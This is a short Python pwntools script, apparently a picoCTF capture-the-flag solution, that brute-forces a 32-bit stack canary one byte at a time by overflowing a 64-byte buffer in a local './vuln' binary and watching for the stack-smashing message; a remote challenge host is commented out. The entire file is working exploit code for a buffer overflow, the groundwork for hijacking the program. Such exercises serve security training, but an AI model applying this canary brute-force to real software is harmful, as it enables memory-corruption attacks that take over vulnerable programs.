from pwn import *

canary = ''

while len(canary) < 4:                                              # Only 1024 iterations, possible because of 32bit
    for i in range(256):                                            # from 00 to FF in each byte
        try:
          p = process('./vuln')
          # p = remote('saturn.picoctf.net', 55980)
          p.sendlineafter('> ', '{}'.format(64 + len(canary) + 1))  # BUF_SIZE + 1 intending to write past canary
          p.sendlineafter('> ', 'A' * 64 + canary + '{}'.format(chr(i)))
          l = p.recvline()

          if '*** Stack Smashing Detected' not in str(l):
              canary += chr(i)
              log.info('Partial canary: {}'.format(canary))
              break

          p.close()
        except:
          p = process('./vuln')
          # p = remote('saturn.picoctf.net', 55980)
          p.sendlineafter('> ', '{}'.format(64 + len(canary) + 1))  # BUF_SIZE + 1 intending to write past canary
          p.sendlineafter('> ', 'A' * 64 + canary + '{}'.format(chr(i)))
          l = p.recvline()

          if '*** Stack Smashing Detected' not in str(l):
              canary += chr(i)
              log.info('Partial canary: {}'.format(canary))
              break

          p.close()

log.info('Found canary: {}'.format(canary))
